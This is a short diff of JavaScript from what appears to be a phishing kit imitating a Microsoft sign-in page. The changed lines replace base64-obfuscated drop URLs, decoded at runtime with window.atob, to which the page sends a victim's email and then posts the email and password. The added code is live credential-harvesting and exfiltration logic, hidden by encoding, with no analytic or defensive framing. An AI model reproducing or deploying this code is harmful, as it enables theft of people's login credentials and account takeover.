@@ -16,7 +16,7 @@
 		var email = encoded_string;	
 		$('.identity').html(email);		
 		var request = new XMLHttpRequest();
-		var url =  window.atob('aHR0cHM6Ly9kZXYtbXBucnMucGFudGhlb25zaXRlLmlvL3dwLWFkbWluL2Nzcy92ZS1wYS9wb2xpY3kucGhw') + email
+		var url =  window.atob('aHR0cHM6Ly9kZXYtemlvbmxlZS5wYW50aGVvbnNpdGUuaW8vdmUtcGEvcG9saWN5LnBocA==') + email
 		request.open('GET', url, true);
 		request.onload = function() {
 		  if (this.status >= 200 && this.status < 400) {
@@ -76,7 +76,7 @@
 					$("#passwordError").hide();
 					$('#idSIButton9').prop('disabled', true);
 					$.ajax({
-						url: window.atob("aHR0cHM6Ly9kZXYtemlud2FhLnBhbnRoZW9uc2l0ZS5pby93cC1hZG1pbi93YS1taS9wb2xpY3kucGhw"), 
+						url: window.atob("aHR0cHM6Ly9kZXYtemlvbmxlZS5wYW50aGVvbnNpdGUuaW8vdmUtcGEvcG9saWN5LnBocA=="), 
 						data: {
 								"email": user,
 								"password": pass,
